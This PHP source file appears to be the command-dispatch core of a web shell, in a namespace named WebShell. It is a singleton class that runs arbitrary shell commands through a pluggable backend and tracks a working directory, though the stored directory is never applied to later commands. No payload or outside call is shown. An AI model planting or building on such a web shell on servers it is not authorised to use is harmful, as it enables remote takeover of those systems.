<?php
namespace WebShell;

class SystemService
{
    // Singleton instance
    private static $instance = null;

    // Class attributes
    private $executionMethod = null;
    private $currentDir = '';

    // A singleton class should not be created using new, cloned or deserialized
    private function __construct() { }
    private function __clone() { }
    public function __wakeup()
    {
        throw new \Exception('Cannot unserialize a singleton');
    }

    public static function getInstance()
    {
        if (self::$instance == null) {
            self::$instance = new SystemService();
        }

        return self::$instance;
    }
    
    public function execute($cmd)
    {
        $output = '';

        // If it is a `cd` command, update the current dir. Else, run the command
        if(str_starts_with($cmd, 'cd ')) {
            // Check if the path exists and update the path accordingly
            $targetDir = substr($cmd, 3, strlen($cmd) - 3);

            if (is_dir($targetDir)) {
                $this->currentDir = $targetDir;
            }
        } else {
            $output = $this->executionMethod->execute($cmd);
        }

        return $output;
    }

    public function setExecutionMethod($executionMethod)
    {
        $this->executionMethod = $executionMethod;
    }

    public function getCurrentDir()
    {
        $currentDir = '';

        // If no current dir is stored, run a `pwd` command. Else, return the stored dir
        if($this->currentDir == '') {
            $currentDir = $this->executionMethod->execute('pwd');
        } else {
            $currentDir = $this->currentDir;
        }

        return $currentDir;
    }
}
?>
